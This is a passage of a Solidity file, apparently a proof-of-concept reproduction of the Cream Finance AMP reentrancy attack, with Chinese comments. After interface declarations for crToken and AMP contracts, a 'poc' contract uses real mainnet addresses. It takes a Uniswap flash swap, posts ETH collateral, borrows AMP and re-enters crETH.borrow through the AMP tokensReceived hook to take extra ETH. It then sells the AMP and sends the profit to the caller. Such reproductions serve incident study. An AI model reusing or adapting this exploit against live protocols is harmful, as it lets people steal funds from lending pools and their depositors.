        function delegateToImplementation(bytes memory data)
            external
            returns (bytes memory);
        function delegateToViewImplementation(bytes memory data)
            external
            view
            returns (bytes memory);
        function exchangeRateCurrent() external returns (uint256);
        function exchangeRateStored() external view returns (uint256);
        function getAccountSnapshot(address account)
            external
            view
            returns (
                uint256,
                uint256,
                uint256,
                uint256
            );
        function getCash() external view returns (uint256);
        function implementation() external view returns (address);
        function interestRateModel() external view returns (address);
        function isCToken() external view returns (bool);
        function liquidateBorrow(
            address borrower,
            uint256 repayAmount,
            address cTokenCollateral
        ) external returns (uint256);
        function mint(uint256 mintAmount) external returns (uint256);
        function name() external view returns (string memory);
        function pendingAdmin() external view returns (address);
        function redeem(uint256 redeemTokens) external returns (uint256);
        function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
        function repayBorrow(uint256 repayAmount) external returns (uint256);
        function repayBorrowBehalf(address borrower, uint256 repayAmount)
            external
            returns (uint256);
        function reserveFactorMantissa() external view returns (uint256);
        function seize(
            address liquidator,
            address borrower,
            uint256 seizeTokens
        ) external returns (uint256);
        function supplyRatePerBlock() external view returns (uint256);
        function symbol() external view returns (string memory);
        function totalBorrows() external view returns (uint256);
        function totalBorrowsCurrent() external returns (uint256);
        function totalReserves() external view returns (uint256);
        function totalSupply() external view returns (uint256);
        function transfer(address dst, uint256 amount) external returns (bool);
        function transferFrom(
            address src,
            address dst,
            uint256 amount
        ) external returns (bool);
        function underlying() external view returns (address);
    }
    interface AMP {
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
        event ApprovalByPartition(
            bytes32 indexed partition,
            address indexed owner,
            address indexed spender,
            uint256 value
        );
        event AuthorizedOperator(
            address indexed operator,
            address indexed tokenHolder
        );
        event AuthorizedOperatorByPartition(
            bytes32 indexed partition,
            address indexed operator,
            address indexed tokenHolder
        );
        event ChangedPartition(
            bytes32 indexed fromPartition,
            bytes32 indexed toPartition,
            uint256 value
        );
        event CollateralManagerRegistered(address collateralManager);
        event Minted(
            address indexed operator,
            address indexed to,
            uint256 value,
            bytes data
        );
        event OwnerUpdate(address indexed oldValue, address indexed newValue);
        event OwnershipTransferAuthorization(address indexed authorizedAddress);
        event PartitionStrategySet(
            bytes4 flag,
            string name,
            address indexed implementation
        );
        event RevokedOperator(
            address indexed operator,
            address indexed tokenHolder
        );
        event RevokedOperatorByPartition(
            bytes32 indexed partition,
            address indexed operator,
            address indexed tokenHolder
        );
        event Swap(address indexed operator, address indexed from, uint256 value);
        event Transfer(address indexed from, address indexed to, uint256 value);
        event TransferByPartition(
            bytes32 indexed fromPartition,
            address operator,
            address indexed from,
            address indexed to,
            uint256 value,
            bytes data,
            bytes operatorData
        );
        function allowance(address _owner, address _spender)
            external
            view
            returns (uint256);
        function allowanceByPartition(
            bytes32 _partition,
            address _owner,
            address _spender
        ) external view returns (uint256);
        function approve(address _spender, uint256 _value) external returns (bool);
        function approveByPartition(
            bytes32 _partition,
            address _spender,
            uint256 _value
        ) external returns (bool);
        function assumeOwnership() external;
        function authorizeOperator(address _operator) external;
        function authorizeOperatorByPartition(bytes32 _partition, address _operator)
            external;
        function authorizeOwnershipTransfer(address _authorizedAddress) external;
        function authorizedNewOwner() external view returns (address);
        function balanceOf(address _tokenHolder) external view returns (uint256);
        function balanceOfByPartition(bytes32 _partition, address _tokenHolder)
            external
            view
            returns (uint256);
        function canImplementInterfaceForAddress(bytes32 _interfaceHash, address)
            external
            view
            returns (bytes32);
        function collateralManagers(uint256) external view returns (address);
        function decimals() external pure returns (uint8);
        function decreaseAllowance(address _spender, uint256 _subtractedValue)
            external
            returns (bool);
        function decreaseAllowanceByPartition(
            bytes32 _partition,
            address _spender,
            uint256 _subtractedValue
        ) external returns (bool);
        function defaultPartition() external view returns (bytes32);
        function granularity() external pure returns (uint256);
        function increaseAllowance(address _spender, uint256 _addedValue)
            external
            returns (bool);
        function increaseAllowanceByPartition(
            bytes32 _partition,
            address _spender,
            uint256 _addedValue
        ) external returns (bool);
        function isCollateralManager(address _collateralManager)
            external
            view
            returns (bool);
        function isOperator(address _operator, address _tokenHolder)
            external
            view
            returns (bool);
        function isOperatorForCollateralManager(
            bytes32 _partition,
            address _operator,
            address _collateralManager
        ) external view returns (bool);
        function isOperatorForPartition(
            bytes32 _partition,
            address _operator,
            address _tokenHolder
        ) external view returns (bool);
        function isPartitionStrategy(bytes4 _prefix) external view returns (bool);
        function name() external view returns (string memory);
        function owner() external view returns (address);
        function partitionStrategies(uint256) external view returns (bytes4);
        function partitionsOf(address _tokenHolder)
            external
            view
            returns (bytes32[] memory);
        function registerCollateralManager() external;
        function revokeOperator(address _operator) external;
        function revokeOperatorByPartition(bytes32 _partition, address _operator)
            external;
        function setPartitionStrategy(bytes4 _prefix, address _implementation)
            external;
        function swap(address _from) external;
        function swapToken() external view returns (address);
        function swapTokenGraveyard() external view returns (address);
        function symbol() external view returns (string memory);
        function totalPartitions() external view returns (bytes32[] memory);
        function totalSupply() external view returns (uint256);
        function totalSupplyByPartition(bytes32) external view returns (uint256);
        function transfer(address _to, uint256 _value) external returns (bool);
        function transferByPartition(
            bytes32 _partition,
            address _from,
            address _to,
            uint256 _value,
            bytes memory _data,
            bytes memory _operatorData
        ) external returns (bytes32);
        function transferFrom(
            address _from,
            address _to,
            uint256 _value
        ) external returns (bool);
    }
    contract poc {
        address constant  AMPToken_Address = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2;
        address constant  registry = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;
        //keccak256("AmpTokensRecipient")
        bytes32 constant  TOKENS_RECIPIENT_INTERFACE_HASH = 0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a;
        address constant uin_WTH9_Pair_Address = 0xd3d2E2692501A5c9Ca623199D38826e513033a17;
        address constant WTH9_AMP_Pair_Address = 0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293;
        address constant WETH9_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant crETH_Address = 0xD06527D5e56A3495252A528C4987003b712860eE;
        address constant crAMP_Address = 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6;
        address constant UniswapV2Router02_address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        address public wallet;
        ////这里必须是一个动态数组，根据uniswap的设计，该数组长度可能为2也可能为3
        address[]  path = [0xfF20817765cB7f73d4bde2e66e067E58D11095C2,0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2];
        function attack() public {
            //注册接口
            IERC1820Registry(registry).setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
            wallet = msg.sender;
            //触发FlashSwap
            Uni_Pair_V2(uin_WTH9_Pair_Address).swap(0, 500*1e18, address(this), "0x00");
        }
        function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
            //把500个WETH转为500个ETH
            WETH9(WETH9_Address).withdraw(500*1e18);
            //把500个ETH质押进Cream
            crETH(crETH_Address).mint{value:500*1e18}();
            //这里很奇怪要先借小额的ETH,才能借出大量的AMP,暂时不清楚原因
            crETH(crETH_Address).borrow(1*1e18);
            //攻击者调用了这个函数,所以我也跟着调
            crAMP(crAMP_Address).accrueInterest();
            //借大量AMP
            crAMP(crAMP_Address).borrow(19480000000000000000000000);
            //把所有ETH转为WETH
            WETH9(WETH9_Address).deposit{value:address(this).balance,gas:40000}();
            //Approve给RouterV2大量AMP,准备卖掉
            AMP(AMPToken_Address).approve(UniswapV2Router02_address,19480000000000000000000000000);
            //卖掉AMP
            Uni_Router_V2(UniswapV2Router02_address).swapExactTokensForTokens(19480000000000000000000000,1,path,address(this),block.timestamp);
            //归还FlashSwap
            WETH9(WETH9_Address).transfer(uin_WTH9_Pair_Address,502*1e18);
            //剩余WETH转回给测试账户
            WETH9(WETH9_Address).transfer(wallet,WETH9(WETH9_Address).balanceOf(address(this)));
        }
        function tokensReceived(
            bytes4 functionSig,
            bytes32 partition,
            address operator,
            address from,
            address to,
            uint256 value,
            bytes calldata data,
            bytes calldata operatorData
        ) external  {
            // 当该攻击合约收到AMP的时候,触发钩子函数，通过重入借出ETH
            crETH(crETH_Address).borrow(354*1e18);
        }
        receive() external payable {
        }
    }
* * *